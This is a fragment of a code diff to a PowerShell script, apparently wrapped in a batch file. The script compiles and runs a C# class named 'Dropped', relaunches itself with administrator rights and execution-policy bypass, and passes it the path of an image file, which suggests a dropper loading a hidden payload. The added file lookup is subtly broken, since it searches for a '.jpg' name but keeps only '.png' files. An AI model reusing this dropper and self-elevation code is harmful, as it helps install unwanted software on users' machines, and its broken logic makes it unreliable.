@@ -51,6 +51,14 @@ public class Dropped
     }
 }
 "@
+$cc = Test-Path $MAIN_PATH\test_image.jpg
+if ($cc -eq $False) {
+    $scriptPath = Split-Path $MyInvocation.MyCommand.Path
+    $targetFileName = "test_image.jpg"
+    $MAIN_PATH = Get-ChildItem $scriptPath -Recurse -Filter $targetFileName ^| Where-Object { $_.Extension -eq ".png" } ^| ForEach-Object {
+        $_.FullName
+    }
+}
 Add-Type -TypeDefinition $CSHARP -Language CSharp
 [Dropped]::Main()
 '@
@@ -90,6 +98,14 @@ public class Dropped
     }
 }
 "@
+$cc = Test-Path $MAIN_PATH\test_image.jpg
+if ($cc -eq $False) {
+    $scriptPath = Split-Path $MyInvocation.MyCommand.Path
+    $targetFileName = "test_image.jpg"
+    $MAIN_PATH = Get-ChildItem $scriptPath -Recurse -Filter $targetFileName ^| Where-Object { $_.Extension -eq ".png" } ^| ForEach-Object {
+        $_.FullName
+    }
+}
 $CSHARP = $CSHARP.Replace("REPLACE", $MAIN_PATH)
 if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process "powershell.exe" -ArgumentList " -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit }
 Add-Type -TypeDefinition $CSHARP -Language CSharp
